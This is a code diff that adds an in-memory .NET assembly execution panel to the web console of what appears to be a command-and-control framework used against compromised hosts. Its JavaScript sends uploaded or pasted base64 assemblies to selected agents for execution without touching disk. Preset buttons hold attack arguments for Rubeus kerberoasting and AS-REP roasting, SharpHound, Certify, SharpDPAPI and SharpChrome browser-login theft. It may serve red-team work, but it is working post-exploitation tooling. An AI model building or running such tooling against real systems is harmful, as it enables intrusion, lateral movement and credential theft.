@@ -1059,6 +1059,77 @@ tr.clickable { cursor: pointer; }
           </div>
         </div>
       </div>
+
+      <!-- .NET Assembly Execution Panel -->
+      <div class="card" style="margin-top:14px">
+        <div class="card-header"><h3><span>⚡</span> .NET Assembly Execution</h3></div>
+        <div class="card-body padded">
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Upload and execute .NET assemblies in-memory (Seatbelt, Rubeus, SharpHound, Certify, etc). No file dropped to disk.</p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+
+            <!-- Upload & Execute -->
+            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
+              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📤 Upload & Execute</h4>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
+                <select id="asm-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+                  <option value="">Select agent...</option>
+                </select>
+              </div>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">.NET Assembly (.exe)</label>
+                <div style="padding:14px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer" onclick="document.getElementById('asm-file').click()" id="asm-dropzone">
+                  <div style="font-size:20px;margin-bottom:4px">⚡</div>
+                  <div style="font-size:11px;color:var(--text-muted)">Drop .NET assembly here</div>
+                  <input type="file" id="asm-file" style="display:none" accept=".exe,.dll" onchange="document.getElementById('asm-dropzone').innerHTML='<div style=color:var(--green)>'+this.files[0].name+' ('+Math.round(this.files[0].size/1024)+'KB)</div>'">
+                </div>
+              </div>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
+                <input id="asm-args" placeholder="-group=all or kerberoast" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              </div>
+              <button class="btn" onclick="executeAssemblyUpload()" style="width:100%;padding:10px;font-size:13px">⚡ Execute In-Memory</button>
+              <div id="asm-upload-result" style="margin-top:8px;font-size:12px"></div>
+            </div>
+
+            <!-- Inline Base64 -->
+            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
+              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📋 Inline Execute (Base64)</h4>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
+                <select id="asm-inline-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+                  <option value="">Select agent...</option>
+                </select>
+              </div>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Base64 Assembly</label>
+                <textarea id="asm-b64" placeholder="Paste base64-encoded .NET assembly..." style="width:100%;height:80px;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:11px;font-family:monospace;resize:vertical"></textarea>
+              </div>
+              <div style="margin-bottom:8px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
+                <input id="asm-inline-args" placeholder="kerberoast /domain:corp.local" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              </div>
+              <button class="btn" onclick="executeAssemblyInline()" style="width:100%;padding:10px;font-size:13px">⚡ Execute Inline</button>
+              <div id="asm-inline-result" style="margin-top:8px;font-size:12px"></div>
+            </div>
+          </div>
+
+          <!-- Quick Presets -->
+          <div style="margin-top:12px;padding:12px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius)">
+            <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Common Assemblies (upload .exe first, then click)</div>
+            <div style="display:flex;flex-wrap:wrap;gap:6px">
+              <button class="qbtn" onclick="setAsmArgs('-group=all')" style="font-size:10px;padding:4px 10px">Seatbelt -group=all</button>
+              <button class="qbtn" onclick="setAsmArgs('kerberoast')" style="font-size:10px;padding:4px 10px">Rubeus kerberoast</button>
+              <button class="qbtn" onclick="setAsmArgs('asreproast')" style="font-size:10px;padding:4px 10px">Rubeus asreproast</button>
+              <button class="qbtn" onclick="setAsmArgs('-c All')" style="font-size:10px;padding:4px 10px">SharpHound -c All</button>
+              <button class="qbtn" onclick="setAsmArgs('find /vulnerable')" style="font-size:10px;padding:4px 10px">Certify find /vulnerable</button>
+              <button class="qbtn" onclick="setAsmArgs('triage')" style="font-size:10px;padding:4px 10px">SharpDPAPI triage</button>
+              <button class="qbtn" onclick="setAsmArgs('all')" style="font-size:10px;padding:4px 10px">SharpUp all</button>
+              <button class="qbtn" onclick="setAsmArgs('logins')" style="font-size:10px;padding:4px 10px">SharpChrome logins</button>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- ══════ EVENTS ══════ -->
@@ -1643,6 +1714,7 @@ refreshAll = async function() {
   updateSessionHealth(agents);
   updateFBAgentSelector(agents);
   updateUploadAgents(agents);
+  updateAsmAgents(agents);
   drawHealthChart(agents);
 };
 
@@ -2620,6 +2692,77 @@ function saveEngagementNotes() {
     engagementNotes = el.value;
     localStorage.setItem('phantom-engagement-notes', engagementNotes);
   }
+}
+
+// ──── .NET Assembly Execution ────
+function setAsmArgs(args) {
+  document.getElementById('asm-args').value = args;
+  document.getElementById('asm-inline-args').value = args;
+}
+
+async function executeAssemblyUpload() {
+  const agent = document.getElementById('asm-agent').value;
+  const file = document.getElementById('asm-file').files[0];
+  const args = document.getElementById('asm-args').value.trim();
+  const result = document.getElementById('asm-upload-result');
+
+  if (!agent) { alert('Select an agent'); return; }
+  if (!file) { alert('Select a .NET assembly file'); return; }
+
+  result.innerHTML = '<span style="color:var(--yellow)">Reading file & uploading...</span>';
+
+  // Read file as base64
+  const reader = new FileReader();
+  reader.onload = async function() {
+    const b64 = btoa(String.fromCharCode(...new Uint8Array(reader.result)));
+    const cmdArgs = 'inline ' + b64 + (args ? ' ' + args : '');
+
+    try {
+      const resp = await fetch('/api/cmd', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
+      });
+      const data = await resp.json();
+      if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
+      result.innerHTML = '<span style="color:var(--green)">Assembly queued (task: '+data.task_id.substring(0,8)+'). Check terminal for output.</span>';
+    } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+  };
+  reader.readAsArrayBuffer(file);
+}
+
+async function executeAssemblyInline() {
+  const agent = document.getElementById('asm-inline-agent').value;
+  const b64 = document.getElementById('asm-b64').value.trim();
+  const args = document.getElementById('asm-inline-args').value.trim();
+  const result = document.getElementById('asm-inline-result');
+
+  if (!agent) { alert('Select an agent'); return; }
+  if (!b64) { alert('Paste base64-encoded assembly'); return; }
+
+  result.innerHTML = '<span style="color:var(--yellow)">Executing...</span>';
+
+  const cmdArgs = 'inline ' + b64 + (args ? ' ' + args : '');
+  try {
+    const resp = await fetch('/api/cmd', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
+    });
+    const data = await resp.json();
+    if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
+    result.innerHTML = '<span style="color:var(--green)">Assembly queued (task: '+data.task_id.substring(0,8)+'). Check terminal for output.</span>';
+  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+}
+
+// Populate assembly agent selectors
+function updateAsmAgents(agents) {
+  ['asm-agent','asm-inline-agent'].forEach(id => {
+    const sel = document.getElementById(id);
+    if (!sel) return;
+    const cur = sel.value;
+    sel.innerHTML = '<option value="">Select agent...</option>' + agents.filter(a=>a.status==='active').map(a =>
+      '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>'
+    ).join('');
+  });
 }
 
 // ──── API Key Management ────
